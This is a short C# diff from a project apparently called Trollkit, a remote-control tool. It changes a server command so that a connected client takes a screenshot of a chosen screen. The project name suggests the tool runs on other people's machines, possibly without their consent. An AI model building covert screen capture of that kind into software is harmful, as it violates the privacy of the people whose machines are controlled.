@@ -109,7 +109,7 @@ namespace Trollkit_Library.ViewModels.Commands
 		/// </summary>
 		private void SendMakeScreenshot()
 		{
-			TransferCommandObject returnObject = new TransferCommandObject { Command = "MakeScreenshot", Handler = handler, Value = "0" };
+			TransferCommandObject returnObject = new TransferCommandObject { Command = "MakeScreenshot", Handler = handler, Value = $"{_server.SelectedClient.SelectedScreen.ScreenId}" };
 			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
